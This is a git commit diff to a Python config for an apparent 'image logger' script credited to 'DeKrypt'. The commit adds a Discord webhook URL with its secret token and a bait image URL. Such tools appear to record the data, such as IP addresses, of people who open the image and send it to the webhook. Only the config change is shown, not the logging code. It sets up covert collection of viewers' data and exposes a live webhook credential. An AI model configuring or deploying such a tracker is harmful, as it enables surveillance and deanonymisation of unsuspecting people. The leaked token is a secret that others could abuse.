755586de51a5f5bfce07d67055f386f636f7554f
mert.cpp <131259379+wroxyxp@users.noreply.github.com>
2025-08-05 22:24:38 +0300

    Update 480.py

--- api/480.py
+++ api/480.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1402370517415104572/5OAXcYuDbd5wpIH49glrpX9ycY4YqtbtR0s-xRQrcf_orXCrl4iBTkxgRdbhreqCCwSk",
+    "image": "https://media.discordapp.net/attachments/1398724248956047464/1402353152954466406/577903b77f88cf9c2610bacbfc0cb5be.jpg?ex=68939aa6&is=68924926&hm=e1529959c5ecfd784e607c2a9c90755086bd62a3a4db53516c9674206e55d07e&=&format=webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
